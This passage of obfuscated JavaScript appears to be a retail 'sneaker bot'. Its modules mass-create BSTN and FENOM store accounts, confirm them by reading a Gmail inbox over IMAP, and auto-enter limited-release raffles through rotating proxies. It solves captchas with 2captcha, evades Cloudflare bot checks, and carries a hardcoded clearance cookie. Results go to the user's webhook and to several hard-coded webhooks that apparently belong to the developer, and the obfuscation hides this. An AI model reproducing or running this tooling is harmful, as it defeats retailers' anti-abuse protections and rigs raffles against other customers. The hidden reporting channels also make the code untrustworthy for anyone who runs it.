                            }), console['log'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x27653c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x27653c['setRequestInterception'](!![]), _0x27653c['on']('request', _0x4fdbfb => {
                                _0x4fdbfb['resourceType']() === 'image' ? _0x4fdbfb['abort']() : _0x4fdbfb['continue']();
                            }), await _0x27653c['goto']('' + _0x38ee51), await _0x27653c['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x27653c['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x90116b(0x7d0), console['log'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x90116b(0x190), await _0x27653c['waitForSelector']('#firstname'), await _0x27653c['type']('#firstname', _0x5443c6[_0x392db9]['FirstName'], { 'delay': 0xf0 }), await _0x90116b(0x190), await _0x27653c['type']('#lastname', _0x5443c6[_0x392db9]['LastName'], { 'delay': 0xe6 }), await _0x90116b(0x190), await _0x27653c['type']('#email_address', _0x5443c6[_0x392db9]['Email'], { 'delay': 0x122 }), await _0x90116b(0x190), await _0x27653c['type']('#password', _0x5443c6[_0x392db9]['Password'], { 'delay': 0x82 }), await _0x90116b(0x1f4), await _0x27653c['type']('#password-confirmation', _0x5443c6[_0x392db9]['Password'], { 'delay': 0x7c }), console['log'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x90116b(0x2bc), await _0x27653c['$eval']('#form-validate', _0x1efdb0 => _0x1efdb0['submit']()), await _0x90116b(0x1388);
                            const _0x474d13 = await _0x27653c['$']('#email_address-error');
                            if (_0x474d13)
                                throw new Error('Invalid\x20Email');
                            const _0x3e84e7 = await _0x27653c['$']('#password-error');
                            if (_0x3e84e7)
                                throw new Error('Invalid\x20Password');
                            await _0x27653c['waitForSelector']('div.mesg-success'), _0x35e71e = 'no', console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Account\x20' + _0x5443c6[_0x392db9]['Email'] + '\x20Generated')), _0x396fe9['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5443c6[_0x392db9]['Email'] + ',' + _0x5443c6[_0x392db9]['Password']);
                            try {
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1733fb['succesDEVMSG']);
                            } catch {
                            }
                            await _0x2860ef(_0x29555e, _0x1733fb['succesDEVMSG']), console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x1e76d0) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20' + _0x1e76d0)), _0x35513c = '' + _0x1e76d0;
                            var _0x43c5ea = await _0x476a56(_0x5443c6[_0x392db9], _0x49d0ed, 'acc', !![], _0x35513c);
                            _0x1733fb['errorDEV'] = { 'embeds': [_0x43c5ea] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1733fb['errorDEV']), await _0x2860ef(_0x406b45, _0x1733fb['errorDEV']), _0x35e71e = 'yes';
                        } finally {
                            _0x47e907['close']();
                            if (_0x35e71e == 'yes' && _0x13fcac != 0x5) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Task\x20' + (_0x392db9 + 0x1) + '\x20:\x20Retrying')), _0x392db9 = _0x392db9 - 0x1, _0x13fcac = _0x13fcac + 0x1;
                                continue;
                            }
                            _0x35e71e == 'yes' && _0x13fcac >= 0x5 && (_0x78fa55(_0x5443c6[_0x392db9], _0x49d0ed), _0x35e71e = 'no', _0x13fcac = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x49d0ed['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5a6557, _0x5b9714, _0x44e957) {
                    var _0x5b9714 = [];
                    async function _0x3d8e39() {
                        var _0x44ddd2 = new _0x59e93a({
                            'user': _0x474e1d['masterMail'],
                            'password': _0x474e1d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2a1f0f(_0x21c65a) {
                            _0x44ddd2['openBox']('INBOX', ![], _0x21c65a);
                        }
                        _0x44ddd2['once']('ready', function () {
                            _0x2a1f0f(function (_0x3b8b0c, _0x123b28) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3b8b0c)
                                    throw _0x3b8b0c;
                                _0x44ddd2['seq']['search'](['UNSEEN'], function (_0x41023e, _0x240b4d) {
                                    if (!_0x240b4d || !_0x240b4d['length'])
                                        console['log'](_0xd645bd() + '\x20[' + _0x5a6557['name'] + ']\x20No\x20mails\x20found'), _0x44ddd2['end']();
                                    else {
                                        var _0x312b3a = _0x44ddd2['seq']['fetch'](_0x240b4d, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x312b3a['on']('message', function (_0xcbe15, _0x50ef30) {
                                            var _0x524e13 = '(#' + _0x50ef30 + ')\x20';
                                            _0xcbe15['on']('body', function (_0x1d7cd8, _0x38d8f9) {
                                                _0x2cd09b(_0x1d7cd8, (_0x502065, _0x3374da) => {
                                                    if (_0x3374da['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x35bad2 = _0x3374da['text']['split']('[')[0x2], _0xe60ebe = _0x35bad2['split'](']')[0x0], _0x3dc29b = _0x3374da['html']['split']('\x0a');
                                                        _0x5b9714['push'](_0xe60ebe);
                                                    }
                                                });
                                            }), _0xcbe15['once']('end', function () {
                                            });
                                        }), _0x312b3a['once']('error', function (_0x5d9b19) {
                                            console['log']('Fetch\x20error:\x20' + _0x5d9b19);
                                        }), _0x312b3a['once']('end', function () {
                                            _0x44ddd2['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x44ddd2['once']('error', function (_0x7302d4) {
                            console['log'](_0x5bbbd3['red'](_0x7302d4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x44ddd2['once']('end', async function () {
                        }), _0x44ddd2['connect']();
                    }
                    async function _0x275e4e(_0x106e56, _0x2374c7, _0x4e7df7) {
                        _0x51bd0a['use'](_0x5a6562());
                        for (var _0x430a7f = 0x0; _0x430a7f < _0x2374c7['length']; _0x430a7f++) {
                            if (_0x439e79 != 'yes')
                                var _0x439e79 = '', _0xdf9131 = 0x0;
                            var _0x49d18c = Math['round'](Math['random']() * (_0x4e7df7['length'] - 0x1)), _0x397c0d = _0x4e7df7[_0x49d18c]['split'](':');
                            const _0x542646 = await _0x51bd0a['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x397c0d[0x0] + ':' + _0x397c0d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x5ee42f = await _0x542646['newPage']();
                                await _0x5ee42f['authenticate']({
                                    'username': '' + _0x397c0d[0x2],
                                    'password': '' + _0x397c0d[0x3]
                                }), console['log'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5ee42f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5ee42f['setRequestInterception'](!![]), _0x5ee42f['on']('request', _0x303964 => {
                                    _0x303964['resourceType']() === 'image' || _0x303964['resourceType']() === 'font' || _0x303964['resourceType']() === 'media' ? _0x303964['abort']() : _0x303964['continue']();
                                }), console['log'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ee42f['goto'](_0x2374c7[_0x430a7f]), console['log'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5ee42f['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5ee42f['waitForSelector']('.account-nav'), _0x439e79 = 'no', console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x41a8b1 = await _0x476a56(null, _0x106e56, 'ver', ![]);
                                    const _0xd28542 = { 'succesDEVMSG': { 'embeds': [_0x41a8b1] } };
                                    await _0x2860ef(_0x305f8a, _0xd28542['succesDEVMSG']);
                                } catch (_0x313c72) {
                                    throw new Error(_0x313c72);
                                }
                            } catch (_0x35e69a) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20' + _0x35e69a));
                                var _0x136b1b = _0x35e69a, _0x33348f = await _0x476a56(null, _0x106e56, 'ver', !![], _0x136b1b);
                                const _0x41b80b = { 'errorDEVMSG': { 'embeds': [_0x33348f] } };
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x41b80b['errorDEVMSG']), await _0x2860ef(_0x406b45, _0x41b80b['errorDEVMSG']), _0x439e79 = 'yes';
                            } finally {
                                _0x542646['close']();
                                if (_0x439e79 == 'yes' && _0xdf9131 != 0x5) {
                                    console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Task\x20' + (_0x430a7f + 0x1) + '\x20:\x20Retrying')), _0x430a7f = _0x430a7f - 0x1, _0xdf9131 = _0xdf9131 + 0x1;
                                    continue;
                                }
                                _0x439e79 == 'yes' && _0xdf9131 >= 0x5 && (_0x439e79 = 'no', _0xdf9131 = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x106e56['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                            }
                        }
                    }
                    try {
                        _0x3d8e39(), await _0x90116b(0xfa0), console['log']('Found\x20' + _0x5b9714['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x275e4e(_0x5a6557, _0x5b9714, _0x44e957);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1ecf1b, _0xf350d2, _0x150c46) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1737a3 = 0x0; _0x1737a3 < _0xf350d2['length']; _0x1737a3++) {
                        var _0x381263;
                        await _0x526adb(_0xf350d2, _0x1737a3);
                        if (_0x272f45 != 'yes')
                            var _0x272f45 = '', _0x152fc7 = 0x0;
                        _0x4e8779(_0x1ecf1b['name'] + '\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20/\x20' + _0xf350d2['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        var _0x1dadb1 = Math['round'](Math['random']() * (_0x150c46['length'] - 0x1)), _0x4448d2 = _0x150c46[_0x1dadb1]['split'](':'), _0x240833;
                        try {
                            _0x240833 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4448d2[0x0] + ':' + _0x4448d2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x240833 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4448d2[0x0] + ':' + _0x4448d2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4ae1d3 = await _0x240833['newPage'](), _0x51794f = await _0x4ae1d3['target']()['createCDPSession'](), { windowId: _0x305f36 } = await _0x51794f['send']('Browser.getWindowForTarget');
                            await _0x4ae1d3['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x2a54a7 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x4ae1d3['authenticate']({
                                'username': '' + _0x4448d2[0x2],
                                'password': '' + _0x4448d2[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ae1d3['goto']('' + _0xf350d2[_0x1737a3]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4ae1d3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x51794f['send']('Browser.setWindowBounds', {
                                'windowId': _0x305f36,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x90116b(0x1388), await _0x4ae1d3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4ae1d3['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x90116b(0x1f4), console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4ae1d3['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x16b344 => _0x16b344['click']()), await _0x4ae1d3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4ae1d3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x90116b(0x7d0), await _0x4ae1d3['waitForSelector']('#email-login'), await _0x4ae1d3['type']('#email-login', '' + _0xf350d2[_0x1737a3]['Email']), await _0x90116b(0xdac), await _0x4ae1d3['waitForSelector']('#password'), await _0x4ae1d3['type']('#password', '' + _0xf350d2[_0x1737a3]['Password'], { 'delay': 0xe6 }), await _0x90116b(0x157c);
                            try {
                                await _0x4ae1d3['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x3b3cad => _0x3b3cad['click']());
                            } catch {
                            }
                            try {
                                await _0x4ae1d3['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x48b47f) {
                            }
                            await _0x90116b(0x3e8);
                            const _0xcff729 = await _0x4ae1d3['$']('.enteredDraw_container__2KmQ_');
                            if (_0xcff729)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xf350d2[_0x1737a3]['Size']);
                            if (_0xf350d2[_0x1737a3]['Size'] != 'RANDOM') {
                                var _0x185507 = _0xf350d2[_0x1737a3]['Size']['replace']('.', ',');
                                const _0x44bf50 = await _0x4ae1d3['$x']('//div[contains(text(),\x20' + _0x185507 + ')]');
                                await _0x44bf50[0x0]['click']();
                            } else {
                                const _0x2107c3 = await _0x4ae1d3['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x540f76 = Math['round'](Math['random']() * (_0x2107c3['length'] - 0x1));
                                await _0x2107c3[_0x540f76]['click']();
                            }
                            await _0x90116b(0x1f4);
                            const _0xb9d638 = await _0x4ae1d3['$']('.addressList_addressItem__LE2PB');
                            if (_0xb9d638 && _0xf350d2[_0x1737a3]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4ae1d3['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x90116b(0x5dc), await _0x4ae1d3['waitForSelector']('#firstname'), await _0x4ae1d3['type']('#firstname', '' + _0xf350d2[_0x1737a3]['FirstName']), await _0x90116b(0x1f4), await _0x4ae1d3['waitForSelector']('#firstname'), await _0x4ae1d3['type']('#lastname', '' + _0xf350d2[_0x1737a3]['LastName']), await _0x90116b(0x1f4), await _0x4ae1d3['waitForSelector']('#firstname'), await _0x4ae1d3['type']('#street', '' + _0xf350d2[_0x1737a3]['Address1']), await _0x90116b(0x1f4), await _0x4ae1d3['waitForSelector']('#firstname'), await _0x4ae1d3['type']('#houseNumber', _0xf350d2[_0x1737a3]['HouseNumber'] + '\x20' + _0xf350d2[_0x1737a3]['Address2']), await _0x90116b(0x1f4), await _0x4ae1d3['waitForSelector']('#firstname'), await _0x4ae1d3['select']('#country_code', '' + _0xf350d2[_0x1737a3]['Country']), await _0x90116b(0x1f4), await _0x4ae1d3['type']('#postcode', '' + _0xf350d2[_0x1737a3]['Zip']), await _0x90116b(0x1f4), await _0x4ae1d3['type']('#city', '' + _0xf350d2[_0x1737a3]['City']), await _0x90116b(0x1f4), await _0x4ae1d3['type']('#telephone', '' + _0xf350d2[_0x1737a3]['Phone']), await _0x90116b(0x1f4), await _0x4ae1d3['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x90116b(0x9c4);
                            try {
                                await _0x4ae1d3['type']('#instagram_name', '' + _0xf350d2[_0x1737a3]['Follower']), await _0x4ae1d3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x90116b(0x5dc);
                            try {
                                await _0x4ae1d3['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x90116b(0x5dc), await _0x4ae1d3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3e09c0 => _0x3e09c0['click']()), await _0x90116b(0x1388);
                            try {
                                await _0x4ae1d3['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x4ae1d3['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0xf350d2[_0x1737a3]['Size'] != 'RANDOM') {
                                    var _0x185507 = _0xf350d2[_0x1737a3]['Size']['replace']('.', ',');
                                    const _0x156507 = await _0x4ae1d3['$x']('//div[contains(text(),\x20' + _0x185507 + ')]');
                                    await _0x156507[0x0]['click']();
                                } else {
                                    const _0x5969d7 = await _0x4ae1d3['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x540f76 = Math['round'](Math['random']() * (_0x5969d7['length'] - 0x1));
                                    await _0x5969d7[_0x540f76]['click']();
                                }
                                await _0x90116b(0x5dc);
                                try {
                                    await _0x4ae1d3['hover']('#instagram_name'), await _0x4ae1d3['type']('#instagram_name', '' + _0xf350d2[_0x1737a3]['Follower']), await _0x4ae1d3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Retrying'), await _0x4ae1d3['hover']('.checkBox_boxHolder__wLGVe'), await _0x90116b(0x5dc), await _0x4ae1d3['click']('.checkBox_boxHolder__wLGVe'), await _0x90116b(0x157c), await _0x4ae1d3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2969e5 => _0x2969e5['click']()), await _0x90116b(0x1388), await _0x4ae1d3['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x272f45 = 'no', _0x2812a5(_0xf350d2[_0x1737a3], _0x1ecf1b), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x3c5c44 = await _0x476a56(_0xf350d2[_0x1737a3], _0x1ecf1b, 'dev', ![]), _0x42d796 = await _0x476a56(_0xf350d2[_0x1737a3], _0x1ecf1b, 'pub', ![]);
                            const _0x1a6b3f = {
                                'succesDEVMSG': { 'embeds': [_0x3c5c44] },
                                'succesPUBMSG': { 'embeds': [_0x42d796] }
                            };
                            try {
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1a6b3f['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x1a6b3f['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x3c50b7, _0x1a6b3f['succesPUBMSG']);
                            } catch (_0x4a493e) {
                                console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4a493e));
                            }
                        } catch (_0x26c067) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20' + _0x26c067)), _0x272f45 = 'yes', _0x381263 = '' + _0x26c067;
                            var _0x4fb9b4 = await _0x476a56(_0xf350d2[_0x1737a3], _0x1ecf1b, 'dev', !![], _0x381263), _0x3c5c44 = await _0x476a56(_0xf350d2[_0x1737a3], _0x1ecf1b, 'dev', ![]), _0x42d796 = await _0x476a56(_0xf350d2[_0x1737a3], _0x1ecf1b, 'pub', ![]);
                            const _0xa9c526 = {
                                'succesDEVMSG': { 'embeds': [_0x3c5c44] },
                                'succesPUBMSG': { 'embeds': [_0x42d796] }
                            };
                            _0xa9c526['errorDEV'] = { 'embeds': [_0x4fb9b4] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0xa9c526['errorDEV']), await _0x2860ef(_0x406b45, _0xa9c526['errorDEV']);
                        } finally {
                            _0x240833['close']();
                            if (_0x272f45 == 'yes' && _0x152fc7 != 0x5) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Task\x20' + (_0x1737a3 + 0x1) + '\x20:\x20Retrying')), _0x1737a3 = _0x1737a3 - 0x1, _0x152fc7 = _0x152fc7 + 0x1;
                                continue;
                            }
                            _0x272f45 == 'yes' && _0x152fc7 >= 0x5 && (_0x78fa55(_0xf350d2[_0x1737a3], _0x1ecf1b), _0x272f45 = 'no', _0x152fc7 = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x1ecf1b['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x47eac2, _0x124082, _0x54db39) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5df39c = 0x0; _0x5df39c < _0x124082['length']; _0x5df39c++) {
                        if (_0x1032b5 != 'yes')
                            var _0x1032b5 = '', _0x539237 = 0x0;
                        var _0x184768;
                        await _0x526adb(_0x124082, _0x5df39c), _0x4e8779(_0x47eac2['name'] + '\x20Task\x20' + (_0x5df39c + 0x1) + '\x20/\x20' + _0x124082['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        var _0x21a53b = await _0x476a56(_0x124082[_0x5df39c], _0x47eac2, 'acc', ![]);
                        const _0x1449e0 = { 'succesDEVMSG': { 'embeds': [_0x21a53b] } }, _0x3ab69a = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2be3f4 = Math['round'](Math['random']() * (_0x54db39['length'] - 0x1)), _0x1344ea = _0x54db39[_0x2be3f4]['split'](':'), _0x2a9d84;
                        try {
                            _0x2a9d84 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1344ea[0x0] + ':' + _0x1344ea[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2a9d84 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1344ea[0x0] + ':' + _0x1344ea[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x21f2f4 = await _0x2a9d84['newPage']();
                            await _0x21f2f4['setViewport']({
                                'width': 0x500 + _0x511730(0x1, 0x32),
                                'height': 0x2d9 + _0x511730(0x1, 0x32)
                            });
                            const _0x34fafa = await _0x21f2f4['target']()['createCDPSession'](), { windowId: _0x13216f } = await _0x34fafa['send']('Browser.getWindowForTarget');
                            await _0x21f2f4['authenticate']({
                                'username': '' + _0x1344ea[0x2],
                                'password': '' + _0x1344ea[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x21f2f4['goto']('' + _0x3ab69a, { 'waitUntil': 'networkidle2' }), await _0x90116b(0x1388), console['log'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x3e303d = await _0x21f2f4['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x3e303d && await _0x3e303d['click']();
                            } catch {
                            }
                            await _0x34fafa['send']('Browser.setWindowBounds', {
                                'windowId': _0x13216f,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x21f2f4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x90116b(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x21f2f4['type']('input[name=\x22firstname\x22]', '' + _0x124082[_0x5df39c]['FirstName']), await _0x90116b(0x1f4), await _0x21f2f4['type']('input[name=\x22lastname\x22]', '' + _0x124082[_0x5df39c]['LastName']), await _0x90116b(0x1f4), await _0x21f2f4['type']('input[name=\x22email\x22]', '' + _0x124082[_0x5df39c]['Email']), await _0x90116b(0x1f4), await _0x21f2f4['type']('input[name=\x22password\x22]', '' + _0x124082[_0x5df39c]['Password']), await _0x90116b(0x258), await _0x21f2f4['$eval']('input[name=\x22psgdpr\x22]', _0x1e0b52 => _0x1e0b52['click']()), await _0x90116b(0x1f4), console['log'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x21f2f4['$eval']('#customer-form', _0x4f474b => _0x4f474b['submit']());
                            try {
